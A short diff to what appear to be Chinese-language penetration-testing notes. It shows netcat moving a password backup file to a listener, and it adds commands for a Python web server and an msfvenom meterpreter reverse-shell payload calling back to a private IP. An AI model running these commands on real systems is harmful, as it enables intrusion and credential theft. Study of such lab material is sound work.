@@ -38,3 +38,15 @@ nc -nvlp 5555 > old-passwords.bak
 nc 192.168.141.134 5555 < /home/jim/backups/old-passwords.bak
 ```
 
+使用python开启web服务
+
+```
+python -m SimpleHTTPServer 8090
+```
+
+使用mefvenom生成一个可执行的shell
+
+```
+msfvenom  -p linux/x86/meterpreter/reverse_tcp  lhost=192.168.42.128 lport=6666 -f elf -o 6666.elf
+```
+
